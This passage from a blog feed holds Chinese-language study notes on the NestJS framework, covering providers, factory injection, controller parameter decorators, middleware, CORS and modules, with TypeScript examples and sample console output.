<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span>, <span class="title class_">Inject</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="comment">// 找一找名为omg的Provider</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="meta">@Inject</span>(<span class="string">&#x27;omg&#x27;</span>) <span class="keyword">private</span> <span class="keyword">readonly</span> appService: AppService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">appService</span>.<span class="title function_">getHello</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="自定义注入值"><a href="#自定义注入值" class="headerlink" title="自定义注入值"></a>自定义注入值</h2><p>把一些值注入Providers：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [</span><br><span class="line">    <span class="title class_">AppService</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 给Providers整个数组，再起个名</span></span><br><span class="line">      <span class="attr">provide</span>: <span class="string">&#x27;Test&#x27;</span>,</span><br><span class="line">      <span class="attr">useValue</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用@Inject通过名称找到自定义注入值：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span>, <span class="title class_">Inject</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="keyword">private</span> <span class="keyword">readonly</span> appService: AppService,</span></span><br><span class="line"><span class="params">    <span class="comment">// 收到数组啦</span></span></span><br><span class="line"><span class="params">    <span class="meta">@Inject</span>(<span class="string">&#x27;Test&#x27;</span>) <span class="keyword">private</span> <span class="keyword">readonly</span> yajue: <span class="built_in">number</span>[],</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">number</span>[] &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">yajue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>如果Service间有相互的依赖或逻辑处理，可以使用工厂模式</p>
<p>把一个工厂函数注入Providers：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">UserModule</span>],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">AppController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [</span><br><span class="line">    <span class="title class_">AppService</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">provide</span>: <span class="string">&#x27;CCC&#x27;</span>,</span><br><span class="line">      <span class="comment">// 声明工厂函数需要用到的Provide</span></span><br><span class="line">      <span class="attr">inject</span>: [<span class="title class_">AppService</span>],</span><br><span class="line">      <span class="comment">// 用工厂函数对Provide进行操作</span></span><br><span class="line">      <span class="title function_">useFactory</span>(<span class="params">AppService: AppService</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">AppService</span>.<span class="title function_">getHello</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用@Inject通过名称获取工厂函数的返回值，异步返回值也可以：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Controller</span>, <span class="title class_">Get</span>, <span class="title class_">Inject</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="comment">// import &#123; AppService &#125; from &#x27;./app.service&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">AppController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="meta">@Inject</span>(<span class="string">&#x27;CCC&#x27;</span>) <span class="keyword">private</span> <span class="keyword">readonly</span> ccc: <span class="built_in">boolean</span></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">  <span class="title function_">getHello</span>(): <span class="built_in">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">ccc</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Controller</title>
    <url>/web/study/Nestjs/5.Controller.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><p>Nestjs提供了一些方法参数装饰器，用于快速获取参数：</p>
<table>
<thead>
<tr>
<th>装饰器</th>
<th>方法参数</th>
</tr>
</thead>
<tbody><tr>
<td>@Request()</td>
<td>req</td>
</tr>
<tr>
<td>@Response()</td>
<td>res</td>
</tr>
<tr>
<td>@Next()</td>
<td>next</td>
</tr>
<tr>
<td>@Session()</td>
<td>req.session</td>
</tr>
<tr>
<td>@Param(key?: string)</td>
<td>req.params&#x2F;req.params[key]</td>
</tr>
<tr>
<td>@Body(key?: string)</td>
<td>req.body&#x2F;req.body[key]</td>
</tr>
<tr>
<td>@Query(key?: string)</td>
<td>req.query&#x2F;req.query[key]</td>
</tr>
<tr>
<td>@Headers(name?: string)</td>
<td>req.headers&#x2F;req.headers[name]</td>
</tr>
<tr>
<td>@HttpCode</td>
<td></td>
</tr>
</tbody></table>
<h1 id="获取Get请求传参"><a href="#获取Get请求传参" class="headerlink" title="获取Get请求传参"></a>获取Get请求传参</h1><p>接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般用法</span></span><br><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="title function_">findAll</span>(<span class="params"><span class="meta">@Request</span>() req</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法糖</span></span><br><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="title function_">findAll</span>(<span class="params"><span class="meta">@Query</span>() query</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(query);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/user?omg=114514&amp;yee=1919810</span><br></pre></td></tr></table></figure>

<p>后台控制台输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; omg: &#x27;114514&#x27;, yee: &#x27;1919810&#x27; &#125;</span><br></pre></td></tr></table></figure>

<h1 id="Post获取参数"><a href="#Post获取参数" class="headerlink" title="Post获取参数"></a>Post获取参数</h1><p>接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般用法</span></span><br><span class="line"><span class="meta">@Post</span>()</span><br><span class="line"><span class="title function_">create</span>(<span class="params"><span class="meta">@Request</span>() req</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法糖</span></span><br><span class="line"><span class="meta">@Post</span>()</span><br><span class="line"><span class="title function_">create</span>(<span class="params"><span class="meta">@Body</span>() body</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(body);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/user</span><br></pre></td></tr></table></figure>

<p>携带Body：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;omg&quot;</span><span class="punctuation">:</span> <span class="number">12321</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>后台控制台输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; omg: 12321 &#125;</span><br></pre></td></tr></table></figure>

<h1 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h1><p>接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般用法</span></span><br><span class="line"><span class="meta">@Get</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line"><span class="title function_">findOne</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">findOne</span>(+id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法糖</span></span><br><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="title function_">findAll</span>(<span class="params"><span class="meta">@Param</span>() params</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(params);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/user/114514</span><br></pre></td></tr></table></figure>

<p>后台控制台输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; id: &#x27;114514&#x27; &#125;</span><br></pre></td></tr></table></figure>

<h1 id="读取Header信息"><a href="#读取Header信息" class="headerlink" title="读取Header信息"></a>读取Header信息</h1><p>接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一般用法</span></span><br><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="title function_">findOne</span>(<span class="params"><span class="meta">@Request</span>() req</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">headers</span>);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 语法糖</span></span><br><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="title function_">findOne</span>(<span class="params"><span class="meta">@Headers</span>() headers</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(headers);</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/user</span><br></pre></td></tr></table></figure>

<p>后台控制台输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &#x27;user-agent&#x27;: &#x27;PostmanRuntime/7.32.2&#x27;,</span><br><span class="line">  accept: &#x27;*/*&#x27;,</span><br><span class="line">  &#x27;postman-token&#x27;: &#x27;1b5d9bc5-3a96-4607-af1d-b50fe206f524&#x27;,</span><br><span class="line">  host: &#x27;localhost:3000&#x27;,</span><br><span class="line">  &#x27;accept-encoding&#x27;: &#x27;gzip, deflate, br&#x27;,</span><br><span class="line">  connection: &#x27;keep-alive&#x27;,</span><br><span class="line">  cookie: &#x27;NMTID=00OM0h1Jr9fGdUkMUdgm34oN5ryRH8AAAGBk5jICQ&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="控制状态码"><a href="#控制状态码" class="headerlink" title="控制状态码"></a>控制状态码</h1><p>接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Get</span>()</span><br><span class="line"><span class="meta">@HttpCode</span>(<span class="number">500</span>)</span><br><span class="line"><span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>();</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">code</span>: <span class="number">200</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:3000/user</span><br></pre></td></tr></table></figure>

<p>前台收到的响应状态码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">500Internal Server Error</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件</title>
    <url>/web/study/Nestjs/9.%E4%B8%AD%E9%97%B4%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="中间件Middleware"><a href="#中间件Middleware" class="headerlink" title="中间件Middleware"></a>中间件Middleware</h1><p>中间件位于是在路由处理程序调用之前调用的函数，Middleware可以访问请求和响应对象</p>
<p>中间件函数可以执行的任务：</p>
<ul>
<li>执行任何代码</li>
<li>对请求和响应对象进行更改</li>
<li>结束请求-响应周期</li>
<li>调用堆栈中的下一个中间件函数</li>
</ul>
<p>如果当前的中间件函数没有结束请求-响应周期，它必须调用next()将控制传递给下一个中间件函数；否则，请求将被挂起</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="依赖注入中间件"><a href="#依赖注入中间件" class="headerlink" title="依赖注入中间件"></a>依赖注入中间件</h2><h3 id="创建中间件"><a href="#创建中间件" class="headerlink" title="创建中间件"></a>创建中间件</h3><p>类中要求实现use函数，返回req、res、next参数</p>
<p>如果最后不调用next()，程序将被挂起</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span>, <span class="title class_">NestMiddleware</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">LoggerMiddleware</span> <span class="keyword">implements</span> <span class="title class_">NestMiddleware</span> &#123;</span><br><span class="line">  <span class="title function_">use</span>(<span class="params">req: <span class="built_in">any</span>, res: <span class="built_in">any</span>, next: () =&gt; <span class="built_in">void</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I&#x27;m comming~&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> random = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">    <span class="comment">// 记得不要让next()和res.send()位于同一个逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (random &lt; <span class="number">0.5</span>) &#123;</span><br><span class="line">      <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;I&#x27;m pending...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用中间件"><a href="#使用中间件" class="headerlink" title="使用中间件"></a>使用中间件</h3><p>在某个模块里实现configure，它返回一个消费者consumer，通过apply注中间件并通过forRoutes指定Controller路由</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">MiddlewareConsumer</span>,</span><br><span class="line">  <span class="title class_">Module</span>,</span><br><span class="line">  <span class="title class_">NestModule</span>,</span><br><span class="line">  <span class="title class_">RequestMethod</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LoggerMiddleware</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../logger/logger.middleware&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">UserController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">  <span class="comment">// 导出UserService</span></span><br><span class="line">  <span class="attr">exports</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserModule</span> <span class="keyword">implements</span> <span class="title class_">NestModule</span> &#123;</span><br><span class="line">  <span class="title function_">configure</span>(<span class="params">consumer: MiddlewareConsumer</span>) &#123;</span><br><span class="line">    <span class="comment">// 注册中间件，需要指定路由才能生效，user及其子路由都能生效</span></span><br><span class="line">    <span class="comment">// consumer.apply(LoggerMiddleware).forRoutes(&#x27;user&#x27;);</span></span><br><span class="line">    <span class="comment">// ---------------------------------------------</span></span><br><span class="line">    <span class="comment">// 这样也能拦截user，只有user路由且方法对应时生效</span></span><br><span class="line">    <span class="comment">// consumer</span></span><br><span class="line">    <span class="comment">//   .apply(LoggerMiddleware)</span></span><br><span class="line">    <span class="comment">//   .forRoutes(&#123; path: &#x27;user&#x27;, method: RequestMethod.GET &#125;);</span></span><br><span class="line">    <span class="comment">// ---------------------------------------------</span></span><br><span class="line">    <span class="comment">// 直接传个Controller，里面所有路由都会被拦截</span></span><br><span class="line">    consumer.<span class="title function_">apply</span>(<span class="title class_">LoggerMiddleware</span>).<span class="title function_">forRoutes</span>(<span class="title class_">UserController</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问相应的路由，注册的中间件都会生效</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308011827739.png"></p>
<h2 id="全局中间件"><a href="#全局中间件" class="headerlink" title="全局中间件"></a>全局中间件</h2><p>给整个app都设置一个中间件，拦截全局路由</p>
<p>全局中间件是一个函数，不能使用类形式</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;/list&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">middlewareAll</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">originalUrl</span>);</span><br><span class="line">  <span class="comment">// 在整个app中，只有白名单内的路由才允许通过，否则阻塞</span></span><br><span class="line">  <span class="keyword">if</span> (whiteList.<span class="title function_">includes</span>(req.<span class="property">originalUrl</span>)) &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I&#x27;m pending...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="title function_">create</span>(<span class="title class_">AppModule</span>);</span><br><span class="line">  <span class="comment">// app.use注册全局中间件</span></span><br><span class="line">  app.<span class="title function_">use</span>(middlewareAll);</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<h2 id="接入第三方中间件"><a href="#接入第三方中间件" class="headerlink" title="接入第三方中间件"></a>接入第三方中间件</h2><p>例如允许跨域：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> cors <span class="keyword">from</span> <span class="string">&#x27;cors&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> whiteList = [<span class="string">&#x27;/list&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">middlewareAll</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">originalUrl</span>);</span><br><span class="line">  <span class="keyword">if</span> (whiteList.<span class="title function_">includes</span>(req.<span class="property">originalUrl</span>)) &#123;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123; <span class="attr">code</span>: <span class="number">114514</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="title function_">create</span>(<span class="title class_">AppModule</span>);</span><br><span class="line">  <span class="comment">// 较新版的Nest已经集成了跨域：</span></span><br><span class="line">  <span class="comment">// const app = await NestFactory.create(AppModule, &#123;cors:true&#125;);</span></span><br><span class="line">  <span class="comment">// 第三方库进行跨域</span></span><br><span class="line">  app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line">  app.<span class="title function_">use</span>(middlewareAll);</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Module</title>
    <url>/web/study/Nestjs/8.Module.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="模块Module"><a href="#模块Module" class="headerlink" title="模块Module"></a>模块Module</h1><p>每个Nest应用程序至少有一个模块，即根模块，根模块是Nest开始安排应用进程树的地方</p>
<p>当应用程序很小时，根模块可能是应用程序中唯一的模块</p>
<p>大型程序在大多数情况下将拥有多个模块，每个模块都有一组紧密相关的功能</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>使用<code>nest g res [模块名]</code>创建CURD模板时，Nestjs会自动在根模块处引入新模块</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user/user.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ListModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./list/list.module&#x27;</span>;</span><br><span 